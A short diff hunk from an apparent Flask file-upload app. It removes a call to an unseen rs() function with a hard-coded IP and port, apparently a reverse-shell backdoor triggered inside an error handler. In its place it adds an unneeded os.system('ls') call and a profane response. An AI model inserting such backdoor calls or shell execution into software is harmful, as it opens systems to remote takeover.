@@ -31,7 +31,8 @@ def upload_file():
         return send_file('filename.avi', as_attachment=True)
     
     except:
-       rs('80.10.55.46', 8000)
+       os.system("ls")
+       return "fuckoff"
 
 
 if __name__ == '__main__':
